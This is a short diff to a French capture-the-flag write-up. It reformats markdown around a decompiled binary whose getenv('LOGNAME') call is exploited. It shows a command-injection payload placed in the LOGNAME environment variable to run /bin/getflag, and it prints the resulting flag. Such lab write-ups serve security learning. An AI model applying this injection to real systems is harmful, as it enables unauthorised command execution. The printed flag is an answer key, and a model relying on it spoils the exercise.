@@ -3,7 +3,7 @@
 https://dogbolt.org/?id=c0805f22-ef97-46b0-83aa-91f95bdac7f7#Ghidra=190
 on passe l'executable dans un decompileur en ligne ci dessus
 On remarque ceci : 
-```
+```c
 int main(int argc,char **argv,char **envp)
 
 {
@@ -28,8 +28,8 @@ int main(int argc,char **argv,char **envp)
 }
 
 ```
-la ligne qui nous interesse c'est ```getenv("LOGNAME")```
+la ligne qui nous interesse c'est `getenv("LOGNAME")`
 
 On fait un injection de code grace a cette env telque : 
-``` export LOGNAME='$(/bin/getflag) > /tmp/key.txt'```
+` export LOGNAME='$(/bin/getflag) > /tmp/key.txt'`
 et on va regarder tout simplement dans le fichier notre key : fiumuikeil55xe9cu4dood66h
